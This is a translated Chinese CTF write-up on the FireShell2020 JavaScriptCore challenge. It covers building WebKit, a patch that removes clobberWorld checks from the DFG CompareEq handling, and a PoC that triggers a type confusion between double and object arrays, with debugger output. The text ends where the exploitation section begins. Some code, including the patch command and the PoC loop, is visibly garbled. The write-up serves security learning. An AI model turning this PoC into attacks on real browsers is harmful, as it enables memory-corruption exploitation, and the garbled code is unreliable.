# FireShell2020——从一道ctf题入门jsc利用
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
###  环境搭建
编译webkit
    sudo apt install libicu-dev python ruby bison flex cmake build-essential ninja-build git gperf
    git clone --depth=1 https://github.com/WebKit/webkit
    git fetch --unshallow
    Tools/gtk/install-dependencies
    Tools/Scripts/set-webkit-configuration --asan  // 配置asan
    Tools/Scripts/build-webkit --jsc-only --debug
    Tools/Scripts/build-webkit --jsc-only --release
编译题目环境：
    git checkout 830f2e892431f6fea022f09f70f2f187950267b7
    cd Source/JavaScriptCore/dfg
    cp DFGAbstractInterpreterInlines.h DFGAbstractInterpreterInlines__patch.h
    git apply argumentCount() isBinaryUseKind(UntypedUse);
    +    //    bool isClobbering = node->isBinaryUseKind(UntypedUse);
    -        if (isClobbering)
    -            didFoldClobberWorld();
    +   //     if (isClobbering)
    +   //         didFoldClobberWorld();
             JSValue leftConst = forNode(node->child1()).value();
             JSValue rightConst = forNode(node->child2()).value();
    @@ -1905,8 +1905,8 @@
                 }
             }
    -        if (isClobbering)
    -            clobberWorld();
    +    //    if (isClobbering)
    +    //        clobberWorld();
             setNonCellTypeForNode(node, SpecBoolean);
             break;
         }
jsc优化的四个阶段：
DFG积极地基于前面(baseline JIT&Interpreter)收集的数据进行类型推测，这样就可以尽早获得类型信息(forward-propagate type
information)，从而减少了大量的类型检查。如果推测失败，DFG取消优化(Deoptimization)，也称为”OSR exit”.
同时该阶段优化也要确保优化不会去除一些可能溢出的边界检查，实现在DFGAbstractInterpreterInlines.h，里面包含一个executeEffects函数用于检查一个操作对后续的优化是否安全，如果不安全，就会调用clobberWorld
函数取消对所有数组类型的推测，表明该优化操作是有风险的。
    // JavascriptCore/dfg/DFGAbstractInterpreterInlines.h
    template 
    void AbstractInterpreter::clobberWorld()
    {
        clobberStructures();
    }
    // JavascriptCore/dfg/DFGAbstractInterpreterInlines.h
    template 
    void AbstractInterpreter::clobberStructures()
    {
        m_state.clobberStructures();
        m_state.mergeClobberState(AbstractInterpreterClobberState::ClobberedStructures);
        m_state.setStructureClobberState(StructuresAreClobbered);
    }
而题目补丁就是将CompareEq操作中clobberWorld
检查去除，简单来说就是CompareEq操作中不会检查对象的类型转换，会直接按照优化结果处理，poc 代码如下：
    var arr = [1.1, 2.2, 3.3];
    arr['a'] = 1;
    var go = function(a, c) {
        a[0] = 1.1;
        a[1] = 2.2;
        c == 1;
        a[2] = 5.67070584648226e-310;
    }
    for(var i = 0; i  {
            arr[0] = {};
            return '1';
        }
    });
    "" + arr[2];
调用toString时，在执行到”c ==
1”前，a的类型为ArrayWithDouble，通过执行arr[0]={}，a的类型变为ArrayWithContiguous，而JIT并没有对类型的转化进行检查，所以执行完”c
==
1”后，依旧认为a的类型为ArrayWithDouble，而实际此时a类型为ArrayWithContiguous，造成类型混淆，浮点数就被当作是一个对象指针。最后””
+ arr[2]; 指针加上字符导致crash。
执行toString前后，arr数组类型从ArrayWithDouble变成ArrayWithContiguous：
    执行toString 前：
    Object: 0x7fc1b3faeee8 with butterfly 0x7fb85b7f83a8 (Structure 0x7fc173bfb4e0:[0x9ce, Array, {a:100}, ArrayWithDouble, Proto:0x7fc1b3fb70e8, Leaf]), StructureID: 2510
    执行toString 后：
    Object: 0x7fc1b3faeee8 with butterfly 0x7fb85b7f83a8 (Structure 0x7fc173bfbde0:[0xb5a4, Array, {a:100}, ArrayWithContiguous, Proto:0x7fc1b3fb70e8, Leaf]), StructureID: 46500
## 漏洞利用
jsc漏洞的利用的一般流程是：